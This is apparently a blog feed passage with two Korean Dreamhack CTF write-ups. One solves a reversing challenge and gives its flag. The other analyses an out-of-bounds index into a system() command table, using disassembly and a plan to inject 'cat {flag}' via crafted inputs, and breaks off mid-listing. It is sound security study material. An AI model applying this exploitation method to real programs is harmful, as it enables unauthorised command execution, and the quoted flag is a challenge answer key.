&lt;h1 id=&quot;1-행위-파악&quot;&gt;1. 행위 파악&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Input을 받는다. 콘솔에서 사용자 입력을 받기 때문에 stdin과 상호작용할 듯?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001210&lt;/code&gt; 에서는 아마 사용자 입력을 받을 것이다&lt;/p&gt;

&lt;p&gt;확인해 보니 맞다&lt;/p&gt;

&lt;p&gt;그럼 Correct는 어떻게 해야 출력될지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-sub_140001000user_input&quot;&gt;2.1. sub_140001000(user_input)&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 식을 가독성 좋게 정리하면 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_140001000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+0h] [rbp-18h]  for ( i = 0; (unsigned __int64)i &amp;lt; 0x12; ++i )  {    if ( *(_DWORD *)&amp;amp;stored_data[4 * i] != (unsigned __int8)usr_input[i] )      return 0i64;  }  return 1i64;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;stored_data는 2차원 배열로, 아래와 같은 값을 가진다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;추가적인 연산을 할 필요 없이, 하드코딩된 데이터가 키값이기 때문에&lt;/p&gt;

&lt;p&gt;DH{Comp4re_the_arr4y}가 정답.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-2</guid>
      </item>
    
      <item>
        <title>Dreamhack-out of bound 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-확인&quot; id=&quot;markdown-toc-0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-행위-확인&quot; id=&quot;markdown-toc-1-행위-확인&quot;&gt;1. 행위 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-및-동적-분석&quot; id=&quot;markdown-toc-2-정적-및-동적-분석&quot;&gt;2. 정적 및 동적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-내부-함수-리스트-확인&quot; id=&quot;markdown-toc-21-내부-함수-리스트-확인&quot;&gt;2.1. 내부 함수 리스트 확인&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-main-함수-확인&quot; id=&quot;markdown-toc-22-main-함수-확인&quot;&gt;2.2. main 함수 확인&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-동적-분석&quot; id=&quot;markdown-toc-23-동적-분석&quot;&gt;2.3. 동적 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ELF32&lt;/li&gt;
  &lt;li&gt;Little endian&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;not stripped&lt;/li&gt;
  &lt;li&gt;c언어 라이브러리 사용&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;스택에서 쉘코드 실행 어려움&lt;/li&gt;
  &lt;li&gt;스택 카나리 켜져 있음&lt;/li&gt;
  &lt;li&gt;PIE는 꺼져 있어서 코드 영역 주소 고정, 즉 plt, got 테이블 고정&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;새로 안 사실: checksec은 사실 pwntools 라이브러리의 하위 응용이었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;가설: plt, got 테이블을 타고 들어가야 할 수도 있겠다, RAO를 사용할 만하다, 가젯을 사용해 ROP을 해야 할 수도?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-행위-확인&quot;&gt;1. 행위 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사용자의 입력을 총 2회 받는다.&lt;/p&gt;

&lt;p&gt;이제 어셈을 분석해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-정적-및-동적-분석&quot;&gt;2. 정적 및 동적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;21-내부-함수-리스트-확인&quot;&gt;2.1. 내부 함수 리스트 확인&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_5.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_5.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;systeml 함수의 plt가 로딩되어 있다는 점을 염두에 두고 접근하자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;22-main-함수-확인&quot;&gt;2.2. main 함수 확인&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;일단 main 함수를 디스어셈블해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_6.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_6.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내부에서 system 함수를 콜하는데 직전에 사용자 입력값의 길이를 제한하지 않아 취약한 함수인 scanf를 사용한다.&lt;/p&gt;

&lt;p&gt;왠지 system 함수에 들어갈 커맨드를 오염시킬 수 있을 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin name:&lt;/code&gt; 을 출력하고, 사용자 입력을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x804a0ac&lt;/code&gt;에 0x10 byte 받는 부분&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x080486f4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x80484b0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;printf@plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x080486f9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x080486fc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x080486ff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048701&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x804a0ac&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048706&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048708&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x80484a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;read@plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;scanf가 값을 읽어와 저장하는 위치(ebp-0x10)&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x08048723&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048726&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048727&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048832&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0804872c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048540&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;__isoc99_scanf@plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;system 함수가 사용하는 커맨드의 위치&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x08048731&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048734&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048737&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804a060&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0804873e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048741&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048742&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;system@plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;line 108이 이해가 안된다. eax는 ebp-0x10 주소값이 들어있는데, 따라서 ebp-0x10 위치에 있는 값을 참조하게 된다.&lt;/p&gt;

&lt;p&gt;그리고 ebp-0x10 에는 사용자의 입력값이 들어 있다.&lt;/p&gt;

&lt;p&gt;코드를 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x804a060&lt;/code&gt; 에 저장된 주소를 베이스로 하고, eax*4를 오프셋으로 하여 커맨드 set에 접근하는 모양새인 것 같은데 맞을까? 그럼 테이블처럼 명령어를 참조하는 방식인 듯 하다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_7.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_7.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;맞는 것 같다. 그럼 테이블의 위치를 참조하기 위해 ebp-0x10위치에 저장되는 사용자의 두 번째 입력값을 이용하는 게 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-동적-분석&quot;&gt;2.3. 동적 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;실제로 프로그램을 run해 보았고, 가설을 세웠다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[시도 1]&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;두번째 입력을 받을 때, ls를 참조하도록 2를 입력해 해당 응용이 위치한 디렉토리 내 파일을 파악한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;[결과]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_8.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_8.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[시도 2]&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;첫번째로 사용자 입력을 받아 저장하는 곳은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x804a0ac&lt;/code&gt; 으로, 명령어 테이블의 시작인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x804a060&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80487f0&lt;/code&gt; 을 저장하고 있고, 0x80487f0에는 문자열로 명령어가 저장되어 있음) 보다 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4C&lt;/code&gt; 큰 주소다.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4C&lt;/code&gt; 을 4로 나누면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x13&lt;/code&gt;이다.&lt;/li&gt;
  &lt;li&gt;그럼 첫번째 입력 시에는 시도 1에서 알아낸 디렉토리 구조를 참고하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat {플래그 파일 이름}&lt;/code&gt; 명령어를 넣고, 두번째 입력 시에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x13&lt;/code&gt;를 넣는다면 내가 원하는 명령어가 참조되지 않을까?&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;[결과]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;되긴 된다. 그런데 문제는 아래 부분이었다.&lt;/p&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x08048731&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048734&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048737&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span 